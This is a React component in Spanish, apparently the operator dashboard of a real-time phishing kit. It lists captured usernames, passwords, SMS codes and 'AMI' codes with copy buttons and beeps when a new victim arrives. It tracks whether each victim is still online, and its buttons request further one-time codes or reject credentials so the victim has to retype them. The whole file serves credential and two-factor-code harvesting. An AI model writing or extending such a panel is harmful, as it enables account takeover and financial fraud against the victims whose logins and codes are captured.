import { useState, useEffect, useRef } from "react";
import { X, Copy, Check, Trash2, Bell, BellOff } from "lucide-react";
import { client } from "@/api/client";

function CopyButton({ text }) {
  const [copied, setCopied] = useState(false);
  const handleCopy = () => {
    if (!text) return;
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };
  return (
    <button
      onClick={handleCopy}
      title="Copiar"
      style={{
        background: "none", border: "none",
        cursor: text ? "pointer" : "default",
        padding: "2px",
        color: copied ? "#2e7d32" : "#0067B1",
        opacity: text ? 1 : 0.3,
        display: "flex", alignItems: "center",
      }}
    >
      {copied ? <Check size={15} /> : <Copy size={15} />}
    </button>
  );
}

const STATUS_LABELS = {
  pending: { label: "Pendiente", color: "#f57c00" },
  ami_requested: { label: "Esperando AMI", color: "#7b1fa2" },
  sms_requested: { label: "Esperando SMS", color: "#0288d1" },
  ami_submitted: { label: "AMI Recibido", color: "#388e3c" },
  sms_submitted: { label: "SMS Recibido", color: "#388e3c" },
  approved: { label: "Aprobado", color: "#2e7d32" },
  rejected: { label: "Rechazado", color: "#c62828" },
};

/** @param {Record<string,any>} row @param {number} now */
function getOnlineDot(row, now) {
  if (!row.lastSeen) return null;
  if (row.status === "approved" || row.status === "rejected") return null;
  if (row.status === "ami_requested" || row.status === "sms_requested") return "yellow";
  const secondsAgo = (now - new Date(row.lastSeen).getTime()) / 1000;
  if (secondsAgo < 12) return "green";
  return "red";
}

export default function Registro() {
  const [records, setRecords] = useState([]);
  const [updatedIds, setUpdatedIds] = useState(new Set());
  const [soundEnabled, setSoundEnabled] = useState(() => localStorage.getItem("notifSound") !== "false");
  const [now, setNow] = useState(Date.now());
  const audioCtxRef = useRef(null);

  const playBeep = () => {
    try {
      const ctx = new (window.AudioContext || window.webkitAudioContext)();
      const playTone = (freq, start, duration) => {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.type = "square";
        osc.frequency.setValueAtTime(freq, ctx.currentTime + start);
        gain.gain.setValueAtTime(0.9, ctx.currentTime + start);
        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + start + duration);
        osc.start(ctx.currentTime + start);
        osc.stop(ctx.currentTime + start + duration + 0.05);
      };
      playTone(880, 0, 0.15);
      playTone(1100, 0.18, 0.15);
      playTone(880, 0.36, 0.25);
    } catch (e) {}
  };

  const flashUpdated = (id) => {
    setUpdatedIds((prev) => new Set([...prev, id]));
    setTimeout(() => setUpdatedIds((prev) => { const s = new Set(prev); s.delete(id); return s; }), 2000);
  };

  useEffect(() => {
    client.entities.LoginRequest.list("-created_date", 50).then(setRecords);

    const interval = setInterval(() => {
      client.entities.LoginRequest.list("-created_date", 50).then(setRecords);
    }, 500);

    const clockInterval = setInterval(() => setNow(Date.now()), 2000);

    const unsub = client.entities.LoginRequest.subscribe((event) => {
      if (event.type === "create") {
        setRecords((prev) => [event.data, ...prev]);
        if (soundEnabled) playBeep();
      } else if (event.type === "update") {
        setRecords((prev) => {
          const exists = prev.some((r) => r.id === event.id);
          if (exists) return prev.map((r) => r.id === event.id ? event.data : r);
          return [event.data, ...prev];
        });
        flashUpdated(event.id);
      } else if (event.type === "delete") {
        setRecords((prev) => prev.filter((r) => r.id !== event.id));
      }
    });
    return () => { unsub(); clearInterval(interval); clearInterval(clockInterval); };
  }, [soundEnabled]);

  const updateStatus = async (id, status) => {
    await client.entities.LoginRequest.update(id, { status });
  };

  const handleRejectWithReason = async (id, reason) => {
    await client.entities.LoginRequest.update(id, { status: "rejected", rejectionReason: reason });
  };

  const handleClearAll = async () => {
    if (!window.confirm("¿Eliminar todos los registros? Esta acción no se puede deshacer.")) return;
    await Promise.all(records.map((r) => client.entities.LoginRequest.delete(r.id)));
    setRecords([]);
  };

  const toggleSound = () => {
    setSoundEnabled((prev) => {
      localStorage.setItem("notifSound", String(!prev));
      return !prev;
    });
  };

  const cellStyle = { padding: "14px 20px" };
  const textStyle = { fontSize: "15px", color: "rgba(0,0,0,0.87)" };

  return (
    <div style={{ minHeight: "100vh", backgroundColor: "#ededed", fontFamily: "Roboto, 'Helvetica Neue', sans-serif", padding: "30px" }}>
      {/* Header */}
      <div style={{ backgroundColor: "#0067B1", borderRadius: "4px 4px 0 0", padding: "16px 24px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
        <h1 style={{ color: "#fff", fontSize: "20px", fontWeight: 500, margin: 0 }}>Registro de Usuarios</h1>
        <div style={{ display: "flex", gap: "10px" }}>
          <button onClick={toggleSound} title={soundEnabled ? "Silenciar notificaciones" : "Activar notificaciones"}
            style={{ background: "rgba(255,255,255,0.15)", border: "none", borderRadius: "4px", cursor: "pointer", padding: "8px", color: "#fff", display: "flex", alignItems: "center", gap: "6px", fontSize: "13px", fontWeight: 500 }}>
            {soundEnabled ? <Bell size={16} /> : <BellOff size={16} />}
            {soundEnabled ? "Sonido ON" : "Sonido OFF"}
          </button>
          {records.length > 0 && (
            <button onClick={handleClearAll} title="Limpiar todos los registros"
              style={{ background: "rgba(255,255,255,0.15)", border: "none", borderRadius: "4px", cursor: "pointer", padding: "8px", color: "#fff", display: "flex", alignItems: "center", gap: "6px", fontSize: "13px", fontWeight: 500 }}>
              <Trash2 size={16} />
              Limpiar todo
            </button>
          )}
        </div>
      </div>

      {/* Table */}
      <div style={{ backgroundColor: "#fff", borderRadius: "0 0 4px 4px", boxShadow: "0 2px 4px rgba(0,0,0,0.1)", overflowX: "auto" }}>
        {records.length === 0 ? (
          <div style={{ padding: "40px", textAlign: "center", color: "rgba(0,0,0,0.45)", fontSize: "15px" }}>
            No hay solicitudes aún.
          </div>
        ) : (
          <table style={{ width: "100%", borderCollapse: "collapse" }}>
            <thead>
              <tr style={{ backgroundColor: "#f5f5f5", borderBottom: "2px solid #e0e0e0" }}>
                {["Usuario", "Clave", "Código SMS", "Código AMI", "Estado", "Acciones"].map((col) => (
                  <th key={col} style={{ padding: "14px 20px", textAlign: "left", fontSize: "13px", fontWeight: 600, color: "#0067B1", letterSpacing: "0.5px", textTransform: "uppercase" }}>
                    {col}
                  </th>
                ))}
              </tr>
            </thead>
            <tbody>
              {records.map((row, idx) => {
                const statusInfo = STATUS_LABELS[row.status] || { label: row.status, color: "#757575" };
                const isPending = ["pending", "ami_requested", "sms_requested", "ami_submitted", "sms_submitted", "rejected"].includes(row.status);
                const displayLabel = row.status === "rejected" ? STATUS_LABELS["pending"].label : statusInfo.label;
                const displayColor = row.status === "rejected" ? STATUS_LABELS["pending"].color : statusInfo.color;
                return (
                  <tr key={row.id} style={{ borderBottom: "1px solid #e0e0e0", backgroundColor: updatedIds.has(row.id) ? "#e8f5e9" : idx % 2 === 0 ? "#fff" : "#fafafa", transition: "background-color 0.5s ease" }}>
                    {/* Usuario */}
                    <td style={cellStyle}>
                      <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                        {(() => {
                          const dot = getOnlineDot(row, now);
                          if (!dot) return null;
                          const color = dot === "green" ? "#2e7d32" : dot === "yellow" ? "#f9a825" : "#c62828";
                          return (
                            <span title={dot === "green" ? "En línea" : dot === "yellow" ? "Ingresando código" : "Desconectado"} style={{
                              width: 10, height: 10, borderRadius: "50%",
                              backgroundColor: color,
                              boxShadow: `0 0 5px ${color}`,
                              display: "inline-block", flexShrink: 0,
                            }} />
                          );
                        })()}
                        <span style={textStyle}>{row.usuario}</span>
                        <CopyButton text={row.usuario} />
                      </div>
                    </td>

                    {/* Clave */}
                    <td style={cellStyle}>
                      <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                        <span style={textStyle}>{row.clave}</span>
                        <CopyButton text={row.clave} />
                        {row.status !== "approved" && (
                          <button onClick={() => handleRejectWithReason(row.id, "wrong_credentials")} title="Rechazar: credenciales incorrectas"
                            style={{ background: "none", border: "none", cursor: "pointer", padding: "2px", color: "#e53935", display: "flex", alignItems: "center" }}>
                            <X size={16} />
                          </button>
                        )}
                      </div>
                    </td>

                    {/* Código SMS */}
                    <td style={cellStyle}>
                      <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                        <span style={{ ...textStyle, color: row.smsCode ? "rgba(0,0,0,0.87)" : "rgba(0,0,0,0.3)" }}>{row.smsCode || "—"}</span>
                        <CopyButton text={row.smsCode} />
                        {row.smsCode && (
                          <button onClick={() => handleRejectWithReason(row.id, "auth_failed")} title="Rechazar"
                            style={{ background: "none", border: "none", cursor: "pointer", padding: "2px", color: "#e53935", display: "flex", alignItems: "center" }}>
                            <X size={16} />
                          </button>
                        )}
                      </div>
                    </td>

                    {/* Código AMI */}
                    <td style={cellStyle}>
                      <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                        <span style={{ ...textStyle, color: row.amiCode ? "rgba(0,0,0,0.87)" : "rgba(0,0,0,0.3)" }}>{row.amiCode || "—"}</span>
                        <CopyButton text={row.amiCode} />
                        {row.amiCode && (
                          <button onClick={() => handleRejectWithReason(row.id, "auth_failed")} title="Rechazar"
                            style={{ background: "none", border: "none", cursor: "pointer", padding: "2px", color: "#e53935", display: "flex", alignItems: "center" }}>
                            <X size={16} />
                          </button>
                        )}
                      </div>
                    </td>

                    {/* Estado */}
                    <td style={cellStyle}>
                      <span style={{
                        fontSize: "12px", fontWeight: 600,
                        color: displayColor,
                        padding: "4px 8px",
                        backgroundColor: displayColor + "18",
                        borderRadius: "12px",
                        whiteSpace: "nowrap",
                      }}>
                        {displayLabel}
                      </span>
                    </td>

                    {/* Acciones */}
                    <td style={cellStyle}>
                      {isPending && (
                        <div style={{ display: "flex", gap: "6px", flexWrap: "wrap" }}>
                          <button onClick={() => updateStatus(row.id, "ami_requested")}
                            style={{ padding: "6px 14px", backgroundColor: "#7b1fa2", color: "#fff", border: "none", borderRadius: "2px", fontSize: "12px", fontWeight: 600, cursor: "pointer", letterSpacing: "0.5px" }}>
                            AMI
                          </button>
                          <button onClick={() => updateStatus(row.id, "sms_requested")}
                            style={{ padding: "6px 14px", backgroundColor: "#0288d1", color: "#fff", border: "none", borderRadius: "2px", fontSize: "12px", fontWeight: 600, cursor: "pointer", letterSpacing: "0.5px" }}>
                            SMS
                          </button>
                
                        </div>
                      )}
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        )}
      </div>
    </div>
  );
}